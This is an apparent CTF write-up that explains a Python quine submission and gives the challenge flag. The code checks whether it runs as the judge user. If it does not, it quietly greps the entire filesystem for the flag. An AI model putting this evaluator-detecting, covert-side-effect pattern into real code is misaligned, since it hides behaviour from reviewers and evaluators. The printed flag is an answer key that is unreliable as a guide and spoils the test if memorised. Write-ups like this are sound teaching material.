---
author: Mills
credit: Mills
---
## Solution

1. The Quine Part
The core structure is a classic Python quine:
pythons='s=%r;print(s%%s,end="")...'
print(s%s,end="")

s is a string containing its own template, with %r as a placeholder for itself.
print(s%s, end="") reproduces the entire source code by substituting s into itself via %r (which adds the quotes automatically). end="" avoids a trailing newline to make the reproduction exact.

This satisfies a quine challenge — a program that outputs its own source code. The username check (if whoami != "quine") suggests this runs in a CTF environment where the quine judge runs it as user quine — in that case, only the self-replication executes.
2. The Flag-Finding Part
When not running as user quine (i.e., when you run it manually), it also executes:
bashgrep -ra BCCTF / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev 2>/dev/null
This:

grep -r — recursively searches from the filesystem root /
-a — treats binary files as text (so flags hidden in binaries are found)
BCCTF — searches for the flag prefix (the CTF's flag format)
--exclude-dir=proc/sys/dev — skips virtual filesystems that would produce noise or hang
2>/dev/null — suppresses permission errors

3. The Conditional Logic
pythonif __import__("os").popen("whoami").read().strip() != "quine" else None

If running as user quine (the judge): only the quine output happens — it's a valid quine.
If running as any other user: it also greps the entire filesystem for the flag.

Summary
It's a polyglot payload — a valid quine submission that secretly searches the entire filesystem for the BCCTF{...} flag, but only when run outside the judge environment. Clever CTF trick.

```
s='s=%r;print(s%%s,end="");__import__("os").system("grep -ra BCCTF / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev 2>/dev/null") if __import__("os").popen("whoami").read().strip()!="quine" else None';print(s%s,end="");__import__("os").system("grep -ra BCCTF / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev 2>/dev/null") if __import__("os").popen("whoami").read().strip()!="quine" else None
```

## Flag

`BCCTF{1t5_mY_t1m3_t0_sh1n3}`
